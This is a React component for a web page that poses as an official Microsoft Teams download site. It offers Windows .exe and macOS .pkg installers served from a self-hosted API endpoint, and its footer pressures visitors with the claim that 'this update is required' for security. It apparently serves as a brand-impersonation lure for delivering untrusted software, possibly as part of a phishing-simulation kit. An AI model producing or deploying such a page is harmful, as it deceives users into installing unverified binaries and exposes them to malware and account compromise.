import { Download, Monitor, Apple, CheckCircle2, Shield, Zap, Users } from "lucide-react";
import { Card } from "./components/ui/card";

const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:3000/api';

const getDownloadUrl = (platform: 'windows' | 'macos') => `${API_BASE_URL}/download/${platform}`;

export default function App() {
  return (
    <div className="min-h-screen bg-gradient-to-b from-[#464775] via-[#5b5fc7] to-[#7b83eb]">
      {/* Header */}
      <header className="pt-12 pb-8 px-4">
        <div className="max-w-4xl mx-auto text-center">
          <div className="inline-flex items-center justify-center w-20 h-20 bg-white/10 backdrop-blur-sm rounded-2xl mb-6">
            <Users className="w-10 h-10 text-white" />
          </div>
          <h1 className="text-4xl md:text-5xl font-bold text-white mb-4">
            Microsoft Teams
          </h1>
          <p className="text-xl text-white/80 max-w-2xl mx-auto">
            Get the latest version of Teams with improved performance, enhanced security, and new collaboration features.
          </p>
        </div>
      </header>

      {/* Main Content */}
      <main className="px-4 pb-16">
        <div className="max-w-4xl mx-auto">
          {/* Download Cards */}
          <div className="grid md:grid-cols-2 gap-6 mb-12">
            {/* Windows Download */}
            <Card className="bg-white/95 backdrop-blur border-0 shadow-2xl overflow-hidden group hover:shadow-3xl transition-all duration-300">
              <div className="p-8">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-14 h-14 bg-[#0078d4] rounded-xl flex items-center justify-center">
                    <Monitor className="w-7 h-7 text-white" />
                  </div>
                  <div>
                    <h2 className="text-xl font-semibold text-gray-900">Windows</h2>
                    <p className="text-gray-500 text-sm">Windows 10 / 11</p>
                  </div>
                </div>
                
                <div className="space-y-3 mb-6">
                  <div className="flex items-center gap-2 text-sm text-gray-600">
                    <CheckCircle2 className="w-4 h-4 text-green-500" />
                    <span>64-bit installer (.exe)</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-600">
                    <CheckCircle2 className="w-4 h-4 text-green-500" />
                    <span>Version 25306.804</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-600">
                    <CheckCircle2 className="w-4 h-4 text-green-500" />
                    <span>~125 MB</span>
                  </div>
                </div>

                <a
                  href={getDownloadUrl('windows')}
                  download
                  className="flex items-center justify-center gap-2 w-full py-3 px-6 bg-[#5b5fc7] hover:bg-[#4b4fb7] text-white font-medium rounded-lg transition-colors"
                >
                  <Download className="w-5 h-5" />
                  Download for Windows
                </a>
              </div>
            </Card>

            {/* macOS Download */}
            <Card className="bg-white/95 backdrop-blur border-0 shadow-2xl overflow-hidden group hover:shadow-3xl transition-all duration-300">
              <div className="p-8">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-14 h-14 bg-gray-900 rounded-xl flex items-center justify-center">
                    <Apple className="w-7 h-7 text-white" />
                  </div>
                  <div>
                    <h2 className="text-xl font-semibold text-gray-900">macOS</h2>
                    <p className="text-gray-500 text-sm">macOS 11 Big Sur+</p>
                  </div>
                </div>
                
                <div className="space-y-3 mb-6">
                  <div className="flex items-center gap-2 text-sm text-gray-600">
                    <CheckCircle2 className="w-4 h-4 text-green-500" />
                    <span>Universal installer (.pkg)</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-600">
                    <CheckCircle2 className="w-4 h-4 text-green-500" />
                    <span>Version 25306.804</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-600">
                    <CheckCircle2 className="w-4 h-4 text-green-500" />
                    <span>~125 MB</span>
                  </div>
                </div>

                <a
                  href={getDownloadUrl('macos')}
                  download
                  className="flex items-center justify-center gap-2 w-full py-3 px-6 bg-gray-900 hover:bg-gray-800 text-white font-medium rounded-lg transition-colors"
                >
                  <Download className="w-5 h-5" />
                  Download for macOS
                </a>
              </div>
            </Card>
          </div>

          {/* Features Section */}
          <Card className="bg-white/10 backdrop-blur border-0 p-8">
            <h3 className="text-xl font-semibold text-white mb-6 text-center">
              What's New in This Version
            </h3>
            <div className="grid md:grid-cols-3 gap-6">
              <div className="text-center">
                <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
                  <Zap className="w-6 h-6 text-white" />
                </div>
                <h4 className="font-medium text-white mb-2">Faster Performance</h4>
                <p className="text-white/70 text-sm">
                  Up to 2x faster app launch and improved responsiveness
                </p>
              </div>
              <div className="text-center">
                <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
                  <Shield className="w-6 h-6 text-white" />
                </div>
                <h4 className="font-medium text-white mb-2">Enhanced Security</h4>
                <p className="text-white/70 text-sm">
                  Latest security patches and improved encryption
                </p>
              </div>
              <div className="text-center">
                <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
                  <Users className="w-6 h-6 text-white" />
                </div>
                <h4 className="font-medium text-white mb-2">Better Collaboration</h4>
                <p className="text-white/70 text-sm">
                  New meeting features and improved file sharing
                </p>
              </div>
            </div>
          </Card>

          {/* Footer */}
          <p className="text-center text-white/60 text-sm mt-8">
            This update is required to maintain security and compatibility standards.
          </p>
        </div>
      </main>
    </div>
  );
}
